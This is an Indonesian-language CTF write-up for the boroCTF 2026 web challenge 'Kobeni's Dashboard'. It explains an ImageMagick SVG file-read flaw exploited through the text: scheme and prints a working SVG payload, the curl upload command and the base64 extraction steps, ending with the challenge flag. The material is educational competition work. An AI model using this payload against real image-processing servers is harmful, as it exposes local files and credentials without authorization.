Writeup boroCTF 2026 — Kobeni's Dashboard (Web)

Analisis Celah Keamanan

Web portal ini menerima unggahan berkas gambar dan menggunakan ImageMagick (x-processor: ImageMagick/unknown) di backend untuk menghasilkan file thumbnail beresolusi statis 100x100 piksel yang dikembalikan sebagai data URI Base64 di HTML.

Kerentanan Local File Inclusion (LFI) / Arbitrary File Read ditemukan pada parser berkas SVG ImageMagick. Fitur render gambar SVG ImageMagick mendukung penggunaan skema internal text: untuk membaca file lokal dan langsung menggambarnya ke atas kanvas.

Kendala utama eksploitasi adalah resolusi gambar hasil render yang sangat kecil (100x100), sehingga teks yang panjang seperti /etc/passwd atau flag akan terkompresi, menumpuk, dan menjadi buram (blur). Masalah ini disiasati dengan menyisipkan parameter internal ImageMagick -pointsize 6 tepat sebelum path file untuk mengecilkan ukuran huruf agar muat sempurna dan tetap tajam dalam ruang yang sempit.

Langkah Eksploitasi

Buat berkas SVG bernama sharp_flag.svg yang memanfaatkan skema pembacaan file dengan konfigurasi ukuran font super kecil:

<svg width="100" height="100" xmlns="[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)">
  <image href="text:-pointsize 6:/flag" width="100" height="100" />
</svg>


Unggah payload menggunakan curl dan simpan hasil respon mentahnya:

curl -s -F "file=@sharp_flag.svg" [https://sj20riah2597.boroctf.com/upload](https://sj20riah2597.boroctf.com/upload) > response.html


Ekstrak string Base64 dari tag <img> di dalam file HTML respon, lalu dekode kembali menjadi gambar PNG bersih:

grep -oP 'data:image/png;base64,\K[^"]+' response.html | base64 -d > flag_tajam.png


Buka berkas flag_tajam.png. Flag kompetisi akan tercetak dengan warna hitam di atas kanvas abu-abu secara tajam dan terbaca jelas.

Flag

boroCTF{I'v3_n3v3r_been_T0_sch00l_3ithEr}
